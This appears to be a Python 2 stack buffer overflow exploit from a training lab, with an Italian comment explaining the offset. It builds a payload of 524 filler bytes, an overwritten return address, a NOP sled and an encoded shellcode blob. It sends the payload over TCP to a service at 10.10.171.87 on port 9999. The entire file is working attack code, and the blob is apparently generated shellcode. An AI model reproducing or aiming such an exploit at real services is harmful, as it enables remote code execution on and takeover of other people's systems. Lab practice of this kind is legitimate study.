#!/usr/bin/python
import sys, socket
from time import sleep

overflow = (
"\xda\xd1\xba\xd4\xb9\xde\xaa\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x53\x17\x83\xeb\xfc\x03\x87\xaa\x3c\x5f\xdb\x25\x42"
"\xa0\x23\xb6\x23\x28\xc6\x87\x63\x4e\x83\xb8\x53\x04\xc1\x34"
"\x1f\x48\xf1\xcf\x6d\x45\xf6\x78\xdb\xb3\x39\x78\x70\x87\x58"
"\xfa\x8b\xd4\xba\xc3\x43\x29\xbb\x04\xb9\xc0\xe9\xdd\xb5\x77"
"\x1d\x69\x83\x4b\x96\x21\x05\xcc\x4b\xf1\x24\xfd\xda\x89\x7e"
"\xdd\xdd\x5e\x0b\x54\xc5\x83\x36\x2e\x7e\x77\xcc\xb1\x56\x49"
"\x2d\x1d\x97\x65\xdc\x5f\xd0\x42\x3f\x2a\x28\xb1\xc2\x2d\xef"
"\xcb\x18\xbb\xeb\x6c\xea\x1b\xd7\x8d\x3f\xfd\x9c\x82\xf4\x89"
"\xfa\x86\x0b\x5d\x71\xb2\x80\x60\x55\x32\xd2\x46\x71\x1e\x80"
"\xe7\x20\xfa\x67\x17\x32\xa5\xd8\xbd\x39\x48\x0c\xcc\x60\x05"
"\xe1\xfd\x9a\xd5\x6d\x75\xe9\xe7\x32\x2d\x65\x44\xba\xeb\x72"
"\xab\x91\x4c\xec\x52\x1a\xad\x25\x91\x4e\xfd\x5d\x30\xef\x96"
"\x9d\xbd\x3a\x38\xcd\x11\x95\xf9\xbd\xd1\x45\x92\xd7\xdd\xba"
"\x82\xd8\x37\xd3\x29\x23\xd0\xd6\xa5\xb8\xa4\x8f\xb7\xbe\xb5"
"\x13\x31\x58\xdf\xbb\x17\xf3\x48\x25\x32\x8f\xe9\xaa\xe8\xea"
"\x2a\x20\x1f\x0b\xe4\xc1\x6a\x1f\x91\x21\x21\x7d\x34\x3d\x9f"
"\xe9\xda\xac\x44\xe9\x95\xcc\xd2\xbe\xf2\x23\x2b\x2a\xef\x1a"
"\x85\x48\xf2\xfb\xee\xc8\x29\x38\xf0\xd1\xbc\x04\xd6\xc1\x78"
"\x84\x52\xb5\xd4\xd3\x0c\x63\x93\x8d\xfe\xdd\x4d\x61\xa9\x89"
"\x08\x49\x6a\xcf\x14\x84\x1c\x2f\xa4\x71\x59\x50\x09\x16\x6d"
"\x29\x77\x86\x92\xe0\x33\xa6\x70\x20\x4e\x4f\x2d\xa1\xf3\x12"
"\xce\x1c\x37\x2b\x4d\x94\xc8\xc8\x4d\xdd\xcd\x95\xc9\x0e\xbc"
"\x86\xbf\x30\x13\xa6\x95")

# dopo i 524 bytes ci dobbiamo scrivere l'indirizzo  311712f3 "al contrario" (Little Endian)
shellcode = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.10.171.87',9999))
	s.send((shellcode))
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
